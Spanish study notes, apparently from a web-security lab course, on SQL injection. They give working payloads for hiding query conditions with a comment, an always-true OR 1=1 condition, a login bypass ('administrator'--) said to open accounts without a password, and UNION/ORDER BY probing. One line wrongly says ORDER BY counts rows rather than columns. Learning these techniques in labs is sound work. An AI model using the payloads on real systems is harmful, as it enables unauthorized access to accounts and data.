# Primer modulo

Para ver los productos ocultos de una pagina, el -- comenta lo que segúia del Query, entonces no hay nada despues

"""
?category=Gifts'--
"""

por eso
"""
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
"""
eso ya no tiene la parte final que era para mostrar solo algunos

Este codigo tambien puede hacerlo ya que siempre es verdadero, nos muestra todos los productos:
?category=Gifts'+OR+1=1--


## Subverting application logic

Esto siguiente si lo pones en el logeo y pones cualquier contraseña podrás entrar a las cuentas:
administrator'--


## Ataques de UNION
Eso debe de ser despues de una consulta algo así despues de la url ?category=Pets <- despues de eso

Puedes realizarlos con esto, y vas subiendo el número para saber cuantas filas hay:
' ORDER BY 3--

Tambien se puede usar esto para saber de cuantas columnas hablamos:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.


